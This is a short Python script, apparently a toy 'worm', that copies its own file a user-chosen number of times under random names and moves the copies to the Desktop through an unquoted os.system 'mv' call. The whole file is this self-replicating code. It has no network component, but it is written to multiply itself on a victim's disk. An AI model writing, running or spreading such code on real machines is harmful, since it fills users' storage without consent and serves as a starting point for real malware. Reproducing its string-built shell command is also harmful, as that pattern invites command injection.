#_*_ coding: utf8 _*_

import os
import shutil
import sys
import random

# Global variables
ADDRESS = '~/Desktop/'
NAME = 'WORM'

# Method: Create text with random letters of length 10
def name_random():
    char = "abcdefghijklmnopqrstuvwyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    letter_random = ''

    for i in range(10):
        letter_random = letter_random + random.choice(char)

    return letter_random

# Method: Move the file to a specified path
def move_script(name):
    os.system('mv %s %s' % (name, ADDRESS))

# Method: Move the file to a specified path
def copy_script():
    for i in range(0, int(sys.argv[1])):
            name = '%s_%s.py' % (NAME, name_random())
            shutil.copy(sys.argv[0], name)
            move_script(name)

# Method: Main method
def main():
    if len(sys.argv) == 2:
        copy_script()

# Start
if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        exit()